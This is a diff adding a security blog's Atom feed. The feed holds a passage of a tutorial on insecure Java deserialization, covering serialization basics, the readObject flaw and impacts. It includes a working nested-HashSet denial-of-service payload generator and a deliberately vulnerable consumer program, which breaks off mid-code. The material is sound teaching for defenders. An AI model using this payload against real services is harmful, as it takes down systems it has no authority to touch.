@@ -1,0 +1,2116 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: web-security | Greyshell's Diary]]></title>
+  <link href="http://greyshell.github.io/blog/categories/web-security/atom.xml" rel="self"/>
+  <link href="http://greyshell.github.io/"/>
+  <updated>2020-05-15T01:06:45-07:00</updated>
+  <id>http://greyshell.github.io/</id>
+  <author>
+    <name><![CDATA[Abhijit Sinha]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Insecure Deserialization in Java]]></title>
+    <link href="http://greyshell.github.io/blog/2019/11/22/insecure-deserialization-java/"/>
+    <updated>2019-11-22T22:17:55-08:00</updated>
+    <id>http://greyshell.github.io/blog/2019/11/22/insecure-deserialization-java</id>
+    <content type="html"><![CDATA[<p>I was always curious about how the actual remote code execution occurs during the Insecure Deserialization process. So I thought of giving a try to understand the known harmful gadgets from <code>commons-collections-3.2.2.jar</code> and develop the entire chain from scratch.</p>
+
+<!-- more -->
+
+
+<h2>Serialization</h2>
+
+<p>Before directly jump into the <code>gadget chain</code> preparation, let&rsquo;s try to understand the root cause of &ldquo;Insecure Deserialization&rdquo;.</p>
+
+<blockquote><p>Serializable is a <strong>marker interface</strong>. It has no <code>data member</code> and <code>method.</code>
+It is used to &ldquo;mark&rdquo; java classes so that objects of these classes may get a certain capability.</p></blockquote>
+
+<p>The fundamental <code>purpose</code> of serialization is to <code>convert</code> the <code>data structure</code> (i.e., state of an object) into a <code>format</code> (for Example: <code>byte stream</code>) that can be <code>stored</code> and <code>transmitted</code> over a network link for future <code>consumption.</code></p>
+
+<p><strong> Example</strong>:</p>
+
+<p>Serialize the <code>User</code> class.</p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="kd">implements</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">Serializable</span> <span class="o">{</span>
+</span><span class='line'>  <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">private</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">nickname</span><span class="o">;</span>  <span class="c1">// final =&gt; NO impact, WILL be serialized</span>
+</span><span class='line'>  <span class="kd">static</span> <span class="kt">int</span> <span class="n">uid</span><span class="o">;</span>  <span class="c1">// static =&gt; NOT serialize this field, int default value = 0</span>
+</span><span class='line'>  <span class="kd">private</span> <span class="kd">transient</span> <span class="n">String</span> <span class="n">password</span><span class="o">;</span> <span class="c1">// transient =&gt; NOT serialize this field, String default value = null</span>
+</span><span class='line'>  <span class="kd">private</span> <span class="kt">double</span> <span class="n">weight</span><span class="o">;</span>
+</span><span class='line'>  <span class="kd">private</span> <span class="n">Car</span> <span class="n">c</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="kd">public</span> <span class="nf">User</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">String</span> <span class="n">nickname</span><span class="o">,</span> <span class="kt">int</span> <span class="n">uid</span><span class="o">,</span> <span class="n">String</span> <span class="n">password</span><span class="o">,</span> <span class="kt">double</span> <span class="n">weight</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">nickname</span> <span class="o">=</span> <span class="n">nickname</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">uid</span> <span class="o">=</span> <span class="n">uid</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">weight</span> <span class="o">=</span> <span class="n">weight</span><span class="o">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c1">// use this constructor if we want to wrap another object</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="nf">User</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">String</span> <span class="n">nickname</span><span class="o">,</span> <span class="kt">int</span> <span class="n">uid</span><span class="o">,</span> <span class="n">String</span> <span class="n">password</span><span class="o">,</span> <span class="kt">double</span> <span class="n">weight</span><span class="o">,</span> <span class="n">Car</span> <span class="n">c</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">nickname</span> <span class="o">=</span> <span class="n">nickname</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">uid</span> <span class="o">=</span> <span class="n">uid</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">weight</span> <span class="o">=</span> <span class="n">weight</span><span class="o">;</span>
+</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">c</span> <span class="o">=</span> <span class="n">c</span><span class="o">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="c1">// this method will be called while printing the object</span>
+</span><span class='line'>  <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&quot; : &quot;</span> <span class="o">+</span> <span class="n">nickname</span> <span class="o">+</span> <span class="s">&quot; : &quot;</span> <span class="o">+</span> <span class="n">uid</span> <span class="o">+</span> <span class="s">&quot; : &quot;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">&quot; : &quot;</span> <span class="o">+</span> <span class="n">weight</span> <span class="o">+</span> <span class="s">&quot; : &quot;</span> <span class="o">+</span> <span class="n">c</span><span class="o">;</span>
+</span><span class='line'>  <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BasicSerialize</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">User</span> <span class="n">asinha</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">User</span><span class="o">(</span><span class="s">&quot;bob&quot;</span><span class="o">,</span> <span class="s">&quot;shell&quot;</span><span class="o">,</span> <span class="mi">2</span><span class="o">,</span> <span class="s">&quot;splunk&quot;</span><span class="o">,</span> <span class="mf">80.5</span><span class="o">);</span>  <span class="c1">// using 1st constructor</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">asinha</span><span class="o">);</span> <span class="c1">// equivalent to asinha.toString()</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">file_name</span> <span class="o">=</span> <span class="s">&quot;serialized_object.ser&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">FileOutputStream</span> <span class="n">fout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileOutputStream</span><span class="o">(</span><span class="n">file_name</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">ObjectOutputStream</span> <span class="n">oout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectOutputStream</span><span class="o">(</span><span class="n">fout</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">asinha</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;User object is written to disk as &quot;</span> <span class="o">+</span> <span class="n">file_name</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// case 2: trying to serialize a Object whoes type is not User. For example: String</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="s">&quot;Hello&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">file_name2</span> <span class="o">=</span> <span class="s">&quot;serialized_object02.ser&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">FileOutputStream</span> <span class="n">fout2</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileOutputStream</span><span class="o">(</span><span class="n">file_name2</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">ObjectOutputStream</span> <span class="n">oout2</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectOutputStream</span><span class="o">(</span><span class="n">fout2</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout2</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fout2</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;String object is written to disk as &quot;</span> <span class="o">+</span> <span class="n">file_name2</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/ser.png" alt="ser" /></p>
+
+<h2>Deserialization</h2>
+
+<p>Deserialization is the reverse process where the <code>byte stream</code> is used to <code>recreate</code> the <code>actual</code> Java object in memory.</p>
+
+<p><strong> Example</strong>:</p>
+
+<p>Deserialize <code>User</code> class.</p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BasicDeserialize</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// by default: enableUnsafeSerialization is set to FALSE, enabling it for Demo</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;true&quot;</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">fname</span> <span class="o">=</span> <span class="s">&quot;../Serialization/serialized_object.ser&quot;</span><span class="o">;</span>  <span class="c1">// good object</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">FileInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileInputStream</span><span class="o">(</span><span class="n">fname</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">ObjectInputStream</span> <span class="n">oin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectInputStream</span><span class="o">(</span><span class="n">fin</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">User</span> <span class="n">u</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oin</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>  <span class="c1">// actual deserialization process happens here</span>
+</span><span class='line'>            <span class="n">oin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The object was read from &quot;</span> <span class="o">+</span> <span class="n">fname</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">u</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/dser.png" alt="dser" /></p>
+
+<p>Recreate the same <code>asinha</code> object in the memory.</p>
+
+<p>However, due to <code>transient</code> and <code>static</code> keyword, the <code>uid</code> and <code>password</code> fields have only the default values.</p>
+
+<h2>The Bug</h2>
+
+<ol>
+<li><p>The <code>readObject</code> method of <code>java.io.ObjectInputStream</code> is vulnerable.</p></li>
+<li><p>During the Deserialization process, the <code>readObject()</code> method is always <code>being</code> called, and it can <code>construct</code> any sort of <code>Serializable</code> object that can be found on the Java <code>classpath</code> before passing it back to the <code>caller</code> for the <code>type_check.</code></p></li>
+<li><p><code>Exception</code> can only happen if a type miss-match occurs between the return object and the expected object.</p></li>
+</ol>
+
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/bad_dser.png" alt="bad_dser" /></p>
+
+<pre><code class="bash">java.lang.ClassCastException: class java.lang.String cannot be cast to class User (java.lang.String is in module java.base of loader 'bootstrap'; User is in unnamed module of loader 'app')
+    at BasicDeserialize.main(BasicDeserialize.java:20)
+</code></pre>
+
+<ol>
+<li>So if the constructed object <code>happens to do anything dangerous</code> during its construction, then it is too late to stop at the point of type <code>checking</code> of that <code>returned</code> object.</li>
+</ol>
+
+
+<h2>Impact</h2>
+
+<ul>
+<li>Remote code execution through property oriented programming(i.e <code>POP</code>) / Gadget Chaining.</li>
+<li>Bypass authorization / escalate privilege via Insecure Direct Object Reference if the object&rsquo;s signature is not verified.</li>
+<li>DoS like consuming the <code>Heap</code> memory.</li>
+</ul>
+
+
+<h3>Perform DoS Attack</h3>
+
+<p>Producer Application:</p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BasicDosExploit</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">Set</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">dos_hashset</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;&gt;();</span>
+</span><span class='line'>            <span class="n">Set</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">dos_hashset</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">Set</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">s2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;&gt;();</span>
+</span><span class='line'>            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+</span><span class='line'>                <span class="n">Set</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">t1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;&gt;();</span>
+</span><span class='line'>                <span class="n">Set</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">t2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;&gt;();</span>
+</span><span class='line'>                <span class="n">t1</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">&quot;foo&quot;</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">s1</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">t1</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">s1</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">t2</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">s2</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">t1</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">s2</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">t2</span><span class="o">);</span>
+</span><span class='line'>                <span class="n">s1</span> <span class="o">=</span> <span class="n">t1</span><span class="o">;</span>
+</span><span class='line'>                <span class="n">s2</span> <span class="o">=</span> <span class="n">t2</span><span class="o">;</span>
+</span><span class='line'>            <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// serializing the HashSet object</span>
+</span><span class='line'>            <span class="kt">byte</span><span class="o">[]</span> <span class="n">userBytes</span> <span class="o">=</span> <span class="o">{};</span>
+</span><span class='line'>            <span class="n">ByteArrayOutputStream</span> <span class="n">bout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ByteArrayOutputStream</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">ObjectOutputStream</span> <span class="n">oout</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectOutputStream</span><span class="o">(</span><span class="n">bout</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">dos_hashset</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">userBytes</span> <span class="o">=</span> <span class="n">bout</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">userBytes</span><span class="o">));</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">oout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">bout</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nThe base64 encoded object: &quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Consumer Application:</p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BasicDosDeserialize</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="c1">// argument: base64 serialized obj as command line</span>
+</span><span class='line'>        <span class="kt">byte</span><span class="o">[]</span> <span class="n">userBytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;rO0AB&quot;</span><span class="o">))</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">userBytes</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">getBytes</span><span class="o">());</span>
+</span><span class='line'>        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nCaught an exception... Invalid object?\n&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>        <span class="n">ByteArrayInputStream</span> <span class="n">bIn</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ByteArrayInputStream</span><span class="o">(</span><span class="n">userBytes</span><span class="o">);</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">ObjectInputStream</span> <span class="n">oIn</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectInputStream</span><span class="o">(</span><span class="n">bIn</span><span class="o">);</span>
